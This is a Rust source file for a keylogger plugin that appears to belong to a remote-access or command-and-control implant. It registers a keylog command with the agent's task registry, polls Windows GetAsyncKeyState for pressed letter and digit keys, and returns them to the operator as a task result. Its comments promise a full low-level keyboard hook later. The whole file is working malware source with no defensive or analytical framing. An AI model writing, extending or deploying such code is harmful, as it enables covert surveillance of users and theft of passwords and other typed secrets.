// keylog plugin — lightweight keyboard snapshot via GetAsyncKeyState.
// Enabled via the "keylog" feature. First version: returns printable keys
// currently pressed (a full low-level hook comes later).

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(crate::protocol::constants::CMD_KEYLOG, exec_keylog)?;
    Ok(())
}

fn exec_keylog(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        let pressed = scan_pressed_keys();
        Some(TaskResult::ok(&task.id, pressed))
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "keylog is Windows-only".into()))
    }
}

#[cfg(target_os = "windows")]
fn scan_pressed_keys() -> String {
    use windows_sys::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
    let mut out = String::new();
    unsafe {
        // 0x41..0x5A = 'A'..'Z'
        for vk in 0x41..=0x5A {
            if (GetAsyncKeyState(vk as i32) as u16) & 0x8000 != 0 {
                let ch = (vk as u8 as char).to_ascii_lowercase();
                out.push(ch);
            }
        }
        // 0x30..0x39 = '0'..'9'
        for vk in 0x30..=0x39 {
            if (GetAsyncKeyState(vk as i32) as u16) & 0x8000 != 0 {
                out.push(vk as u8 as char);
            }
        }
    }
    if out.is_empty() {
        "no keys pressed\n".to_string()
    } else {
        format!("pressed: {}\n", out)
    }
}
